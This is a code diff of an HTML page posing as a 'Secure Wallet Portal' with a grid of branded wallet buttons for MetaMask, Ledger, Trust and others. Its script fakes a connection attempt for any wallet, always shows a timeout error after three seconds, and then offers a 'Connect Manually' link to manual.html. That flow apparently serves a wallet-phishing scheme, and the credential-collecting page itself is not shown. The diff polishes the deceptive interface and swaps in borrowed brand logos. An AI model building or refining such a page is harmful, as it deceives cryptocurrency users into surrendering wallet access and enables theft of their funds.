@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet | Secure Portal</title>
+    <title>Secure Wallet Portal</title>
     <style>
         :root {
             --bg: #0f1217;
@@ -21,10 +21,9 @@
             color: var(--text-main);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
-            padding: 20px;
         }
 
-        .container { width: 100%; max-width: 480px; }
+        .container { width: 100%; max-width: 480px; padding: 20px; }
 
         .card {
             background: var(--card-bg);
@@ -32,24 +31,22 @@
             border-radius: 24px;
             padding: 30px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
 
-        .logo-top { width: 60px; height: 60px; margin-bottom: 20px; }
-        
+        .logo-top { width: 50px; height: 50px; margin-bottom: 20px; border-radius: 12px; }
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
         h6 { color: var(--text-dim); font-size: 14px; margin-bottom: 30px; font-weight: 400; }
 
         .wallet-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
-            max-height: 480px;
+            gap: 12px;
+            max-height: 520px;
             overflow-y: auto;
-            padding: 10px;
+            padding: 5px;
         }
 
-        /* Scrollbar styling */
+        /* Scrollbar */
         .wallet-grid::-webkit-scrollbar { width: 4px; }
         .wallet-grid::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
 
@@ -57,51 +54,44 @@
             background: var(--item-bg);
             border: 1px solid var(--border);
             border-radius: 16px;
-            padding: 15px 10px;
+            padding: 15px 5px;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: 0.2s;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
         }
 
         .wallet-item:hover {
             border-color: var(--accent);
-            background: #2d333b;
-            transform: translateY(-3px);
+            transform: translateY(-2px);
         }
 
         .wallet-icon {
-            width: 45px;
-            height: 45px;
+            width: 44px;
+            height: 44px;
             object-fit: contain;
             margin-bottom: 10px;
-            border-radius: 8px;
+            border-radius: 10px;
         }
 
-        .wallet-name {
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--text-main);
-        }
+        .wallet-name { font-size: 11px; font-weight: 600; color: var(--text-main); }
 
-        /* Connecting Modal State */
+        /* Modal Overlay */
         .modal-overlay {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             z-index: 1000;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(8px);
         }
 
         .loader {
-            width: 50px;
-            height: 50px;
+            width: 40px; height: 40px;
             border: 4px solid #30363d;
             border-top: 4px solid var(--accent);
             border-radius: 50%;
@@ -110,23 +100,11 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .error-msg {
-            color: #ff7b72;
-            display: none;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-
+        .error-msg { color: #ff7b72; display: none; margin-top: 15px; font-size: 14px; }
         .btn-manual {
-            display: none;
-            margin-top: 20px;
-            background: var(--accent);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 10px;
-            text-decoration: none;
-            font-weight: 600;
+            display: none; margin-top: 20px; background: var(--accent);
+            color: white; padding: 12px 24px; border-radius: 12px;
+            text-decoration: none; font-weight: 600;
         }
     </style>
 </head>
@@ -134,72 +112,83 @@
 
 <div id="connectingModal" class="modal-overlay">
     <div id="spinner" class="loader"></div>
-    <h2 id="modalTitle">Initializing Connection...</h2>
-    <p id="errorTxt" class="error-msg">Unable to establish secure connection</p>
+    <h2 id="modalTitle">Connecting...</h2>
+    <p id="errorTxt" class="error-msg">Connection Request Timeout</p>
     <a href="manual.html" id="manualBtn" class="btn-manual">Connect Manually</a>
 </div>
 
 <div class="container">
     <div class="card">
-        <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" class="logo-top" alt="Logo">
+        <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/walletConnectWallet/walletConnectWallet.png" class="logo-top">
         <h1>Connect Wallet</h1>
-        <h6>Please connect your wallet to continue</h6>
+        <h6>Select a provider to continue</h6>
 
         <div class="wallet-grid">
-            <div class="wallet-item" onclick="handleConnect('Trust Wallet')">
-                <img src="https://assets.pancakeswap.finance/web/wallets/trust.png" class="wallet-icon">
-                <span class="wallet-name">Trust</span>
+            <div class="wallet-item" onclick="handleConnect('WalletConnect')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/walletConnectWallet/walletConnectWallet.png" class="wallet-icon">
+                <span class="wallet-name">WalletConnect</span>
             </div>
+
             <div class="wallet-item" onclick="handleConnect('MetaMask')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/metaMaskWallet/metaMaskWallet.png" class="wallet-icon">
                 <span class="wallet-name">MetaMask</span>
             </div>
-            <div class="wallet-item" onclick="handleConnect('Coinbase')">
-                <img src="https://assets.pancakeswap.finance/web/wallets/coinbase.png" class="wallet-icon">
-                <span class="wallet-name">Coinbase</span>
+
+            <div class="wallet-item" onclick="handleConnect('Trust Wallet')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/trustWallet/trustWallet.png" class="wallet-icon">
+                <span class="wallet-name">Trust</span>
             </div>
+
             <div class="wallet-item" onclick="handleConnect('Phantom')">
-                <img src="https://raw.githubusercontent.com/phantom-labs/brand-assets/main/logos/icon/purple.png" class="wallet-icon">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/phantomWallet/phantomWallet.png" class="wallet-icon">
                 <span class="wallet-name">Phantom</span>
             </div>
-            <div class="wallet-item" onclick="handleConnect('Ledger')">
-                <img src="https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png" class="wallet-icon">
-                <span class="wallet-name">Ledger</span>
+
+            <div class="wallet-item" onclick="handleConnect('OKX')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/okxWallet/okxWallet.png" class="wallet-icon">
+                <span class="wallet-name">OKX</span>
             </div>
+
             <div class="wallet-item" onclick="handleConnect('Exodus')">
                 <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/exodus.png" class="wallet-icon">
                 <span class="wallet-name">Exodus</span>
             </div>
-            <div class="wallet-item" onclick="handleConnect('Binance')">
-                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" class="wallet-icon">
-                <span class="wallet-name">Binance</span>
+
+            <div class="wallet-item" onclick="handleConnect('Rainbow')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/rainbowWallet/rainbowWallet.png" class="wallet-icon">
+                <span class="wallet-name">Rainbow</span>
             </div>
-            <div class="wallet-item" onclick="handleConnect('SafePal')">
-                <img src="https://safepal.com/favicon.ico" class="wallet-icon">
-                <span class="wallet-name">SafePal</span>
+
+            <div class="wallet-item" onclick="handleConnect('Coinbase')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/coinbaseWallet/coinbaseWallet.png" class="wallet-icon">
+                <span class="wallet-name">Coinbase</span>
             </div>
-            <div class="wallet-item" onclick="handleConnect('OKX')">
-                <img src="https://www.okx.com/favicon.ico" class="wallet-icon">
-                <span class="wallet-name">OKX</span>
+
+            <div class="wallet-item" onclick="handleConnect('Argent')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/argentWallet/argentWallet.png" class="wallet-icon">
+                <span class="wallet-name">Argent</span>
             </div>
+
+            <div class="wallet-item" onclick="handleConnect('Ledger')">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/ledgerWallet/ledgerWallet.png" class="wallet-icon">
+                <span class="wallet-name">Ledger</span>
+            </div>
+
             <div class="wallet-item" onclick="handleConnect('Uniswap')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Uniswap_Logo.svg" class="wallet-icon">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/uniswapWallet/uniswapWallet.png" class="wallet-icon">
                 <span class="wallet-name">Uniswap</span>
             </div>
+
             <div class="wallet-item" onclick="handleConnect('Rabby')">
-                <img src="https://rabby.io/assets/images/logo.png" class="wallet-icon">
+                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/rabbyWallet/rabbyWallet.png" class="wallet-icon">
                 <span class="wallet-name">Rabby</span>
-            </div>
-            <div class="wallet-item" onclick="handleConnect('Rainbow')">
-                <img src="https://rainbow.me/favicon.png" class="wallet-icon">
-                <span class="wallet-name">Rainbow</span>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    function handleConnect(walletName) {
+    function handleConnect(name) {
         const modal = document.getElementById('connectingModal');
         const spinner = document.getElementById('spinner');
         const title = document.getElementById('modalTitle');
@@ -207,12 +196,14 @@
         const manualBtn = document.getElementById('manualBtn');
 
         modal.style.display = 'flex';
-        title.innerText = "Connecting to " + walletName + "...";
+        title.innerText = "Connecting " + name + "...";
+        spinner.style.display = 'block';
+        error.style.display = 'none';
+        manualBtn.style.display = 'none';
 
-        // Mimic VergePortal behavior: spin for a bit, then show error/manual connect
         setTimeout(() => {
             spinner.style.display = 'none';
-            title.innerText = "Connection Failed";
+            title.innerText = "Error Connecting";
             error.style.display = 'block';
             manualBtn.style.display = 'block';
         }, 3000);
